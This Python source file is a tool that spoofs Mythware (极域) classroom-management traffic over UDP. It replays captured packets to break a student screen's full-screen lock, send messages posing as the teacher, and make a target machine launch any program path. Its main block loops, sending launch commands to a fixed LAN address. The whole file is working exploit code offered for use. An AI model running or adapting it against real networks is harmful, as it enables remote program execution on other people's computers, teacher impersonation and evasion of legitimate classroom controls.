"""
Mythware极域课堂系统通信模块
提供与极域课堂系统通信的功能，包括反全屏、发送教师消息和启动应用程序
Powered by Coco
Thank you!
————wyx6669036
"""
import socket
import struct
import time
import ctypes
from packages import UtilsManager as utils
from packages.utils.ErrorHandler import handle_exception, NetworkError
from packages.utils.ConfigManager import config

# 从配置管理器获取目标端口
TARGET_PORT = config.get("target_port", 4705)


@handle_exception(NetworkError, default_return=False, error_message="Failed to send anti full screen packet")
def anti_full_screen(target_ip, target_port=TARGET_PORT):
    """
    反全屏功能 - 发送反全屏数据包到指定IP
    
    Args:
        target_ip (str): 目标IP地址
        target_port (int): 目标端口，默认为4705
        
    Returns:
        bool: 发送成功返回True，失败返回False
    """
    # 创建UDP套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(config.get("timeout", 5))  # 从配置管理器获取超时时间
    
    # 获取反全屏数据包
    payload = _get_anti_full_screen_payload()
    
    # 目标地址和端口
    target_addr = (target_ip, target_port)

    try:
        # 发送数据包
        sock.sendto(payload, target_addr)
        utils.info(f"[+] Sent to {target_ip}:{target_port} (anti_full_screen)")
        return True
    except socket.timeout:
        utils.error(f"[-] Timeout while sending anti full screen packet to {target_ip}:{target_port}")
        return False
    except socket.error as e:
        utils.error(f"[-] Socket error while sending anti full screen packet: {e}")
        return False
    except Exception as e:
        utils.error(f"[-] Failed to send to {target_ip}: {e}")
        return False
    finally:
        sock.close()


def _get_anti_full_screen_payload():
    """
    获取反全屏数据包
    
    Returns:
        bytearray: 反全屏数据包
    """
    # 嗯抓包抓到的嗯对
    payload = bytearray([
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00,
        0x01, 0x00, 0xc6, 0x00, 0x00, 0x00, 0x1a, 0x8f, 0xd9, 0xc3, 0x60, 0xad, 0x07, 0x41, 0xac, 0xf0,
        0xc0, 0xfb, 0x12, 0x7d, 0x06, 0x1d, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x99, 0x81, 0xb9, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x20, 0x00, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
        0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x11, 0x2b, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x5e, 0x01, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x02, 0x00,
        0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0xa0, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x19, 0x00,
        0x00, 0x00, 0x4b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0xa8, 0x99, 0x81, 0x04, 0x00,
        0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x03,
        0xe0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6e, 0x00
    ])

    # 修改第19字节为GetTickCount()低8位
    payload[19] = ctypes.windll.kernel32.GetTickCount() & 0xFF
    
    return payload


@handle_exception(NetworkError, default_return=False, error_message="Failed to send teacher message")
def send_teacher_message(text, target_ip, target_port=TARGET_PORT):
    """
    以老师身份发送消息到指定IP
    
    Args:
        text (str): 要发送的消息内容
        target_ip (str): 目标IP地址
        target_port (int): 目标端口，默认为4705
        
    Returns:
        bool: 发送成功返回True，失败返回False
    """
    # 验证IP地址格式
    try:
        import socket
        socket.inet_aton(target_ip)
    except socket.error as e:
        utils.error(f"[-] Invalid IP address format: {target_ip} - {e}")
        return False
    except Exception as e:
        utils.error(f"[-] Error validating IP address {target_ip}: {e}")
        return False
    
    # 创建UDP套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(config.get("timeout", 5))  # 从配置管理器获取超时时间
    
    # 获取教师消息数据包
    try:
        payload = _get_teacher_message_payload(text)
    except Exception as e:
        utils.error(f"[-] Failed to create message payload: {e}")
        sock.close()
        return False
    
    # 目标地址和端口
    target_addr = (target_ip, target_port)

    try:
        # 发送数据包
        sock.sendto(payload, target_addr)
        utils.info(f"[+] Sent to {target_ip}:{target_port} (send_teacher_message)")
        return True
    except socket.timeout:
        utils.error(f"[-] Timeout while sending teacher message to {target_ip}:{target_port}")
        return False
    except socket.error as e:
        # 详细记录不同类型的socket错误
        if "getaddrinfo failed" in str(e):
            utils.error(f"[-] DNS resolution failed for {target_ip}: {e}")
        elif "Connection refused" in str(e):
            utils.error(f"[-] Connection refused by {target_ip}:{target_port}")
        elif "Network is unreachable" in str(e):
            utils.error(f"[-] Network is unreachable for {target_ip}")
        else:
            utils.error(f"[-] Socket error while sending teacher message to {target_ip}: {e}")
        return False
    except Exception as e:
        utils.error(f"[-] Failed to send to {target_ip}: {e}")
        return False
    finally:
        sock.close()


def _get_teacher_message_payload(text):
    """
    获取教师消息数据包
    
    Args:
        text (str): 要发送的消息内容
        
    Returns:
        bytearray: 教师消息数据包
        
    Raises:
        ValueError: 当数据包长度不正确时抛出异常
    """
    # 使用预定义的常量字节数组，避免重复创建
    header = bytes([
        0x44,0x4d,0x4f,0x43,0x00,0x00,
        0x01,0x00,0x9e,0x03,0x00,0x00,0xac,0x31,0x67,0xfc,0x4c,0x74,0x11,0x4d,0xa7,0x42,
        0x60,0x84,0xf9,0x3e,0x40,0x3c,0x20,0x4e,0x00,0x00,0xc0,0xa8,0x99,0x81,0x91,0x03,
        0x00,0x00,0x91,0x03,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x05,0x00,
        0x00,0x00
    ])
    tail = bytes([
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x0a,0x00
    ])
    
    # 预计算长度，减少重复调用
    max_message_length = config.get("max_message_length", 954)
    max_middle_length = max_message_length - len(header) - len(tail)

    # 优化文本转换，直接在目标字节数组中操作
    middle_data = _text_to_bytearray(text, max_middle_length)
        
    # 预分配最终数组大小，避免多次内存重分配
    payload = bytearray(len(header) + len(middle_data) + len(tail))
    payload[0:len(header)] = header
    payload[len(header):len(header)+len(middle_data)] = middle_data
    payload[len(header)+len(middle_data):] = tail
        
    # 验证数据包长度
    if len(payload) != max_message_length:
        utils.error(f"[-] pack lenth err: lenth{len(payload)}，should be {max_message_length}")
        raise ValueError(f"pack lenth err: lenth{len(payload)}，should be {max_message_length}")
    
    # 修改第19字节为GetTickCount()低8位
    payload[19] = ctypes.windll.kernel32.GetTickCount() & 0xFF
    
    return payload


def _text_to_bytearray(text, max_length):
    """
    将文本转换为字节数组，优化性能
    
    Args:
        text (str): 要转换的文本
        max_length (int): 最大长度
        
    Returns:
        bytearray: 转换后的字节数组
    """
    if not text:
        return bytearray(max_length)
        
    # 直接编码为UTF-16-LE，避免逐字符处理
    encoded = text.encode('utf-16-le')
    
    # 确保不超过最大长度
    if len(encoded) > max_length:
        encoded = encoded[:max_length]
        
    # 创建指定长度的字节数组并复制数据
    result = bytearray(max_length)
    result[:len(encoded)] = encoded
    
    return result


@handle_exception(NetworkError, default_return=False, error_message="Failed to start application")
def start_applicaion(path, target_ip, target_port=TARGET_PORT):
    """
    以老师身份打开指定程序
    
    Args:
        path (str): 要打开的程序路径，使用单斜杠，如C:\Windows\system32\bbb.exe
        target_ip (str): 目标IP地址
        target_port (int): 目标端口，默认为4705
        
    Returns:
        bool: 发送成功返回True，失败返回False
    """
    # 创建UDP套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(config.get("timeout", 5))  # 从配置管理器获取超时时间
    
    # 获取启动应用程序数据包
    payload = _get_start_application_payload(path)
    
    # 目标地址和端口
    target_addr = (target_ip, target_port)

    try:
        # 发送数据包
        sock.sendto(payload, target_addr)
        utils.info(f"[+] Sent to {target_ip}:{target_port} (start_application)")
        return True
    except socket.timeout:
        utils.error(f"[-] Timeout while sending application start command to {target_ip}:{target_port}")
        return False
    except socket.error as e:
        utils.error(f"[-] Socket error while sending application start command: {e}")
        return False
    except Exception as e:
        utils.error(f"[-] Failed to send to {target_ip}: {e}")
        return False
    finally:
        sock.close()


def _get_start_application_payload(path):
    """
    获取启动应用程序数据包
    
    Args:
        path (str): 要打开的程序路径
        
    Returns:
        bytearray: 启动应用程序数据包
        
    Raises:
        ValueError: 当数据包长度不正确时抛出异常
    """
    # 数据包。
    header = bytearray([
        0x44,0x4d,0x4f,0x43,0x00,0x00,
        0x01,0x00,0x6e,0x03,0x00,0x00,0x2b,0xca,0x3d,0xda,0xe1,0x61,0x63,0x4c,0x94,0x92,
        0xc9,0x01,0xd4,0x26,0xac,0xe4,0x20,0x4e,0x00,0x00,0xc0,0xa8,0x99,0x81,0x61,0x03,
        0x00,0x00,0x61,0x03,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x0f,0x00,
        0x00,0x00,0x01,0x00,0x00,0x00
    ])
    max_middle_length = config.get("max_path_length", 906) - len(header)

    # 将路径转换为UTF-16-LE编码的字节数组
    middle_data = bytearray(path.encode('utf-16-le'))
        
    # 如果中间数据长度不足，用0x00填充
    if len(middle_data) < max_middle_length:
        padding_length = max_middle_length - len(middle_data)
        middle_data.extend([0x00] * padding_length)
    # 如果超过最大长度，截断
    elif len(middle_data) > max_middle_length:
        middle_data = middle_data[:max_middle_length]
        
    # 组合完整的数据包
    payload = header + middle_data

    # 验证数据包长度
    expected_length = config.get("max_path_length", 906)
    if len(payload) != expected_length:
        utils.error(f"[-] pack lenth err: lenth{len(payload)}，should be {expected_length}")
        raise ValueError(f"pack lenth err: lenth{len(payload)}，should be {expected_length}")
    
    # 修改第19字节为GetTickCount()低8位
    payload[19] = ctypes.windll.kernel32.GetTickCount() & 0xFF
    
    return payload


if __name__ == "__main__":
    while 1:
        start_applicaion(input("path: "),"192.168.153.130")
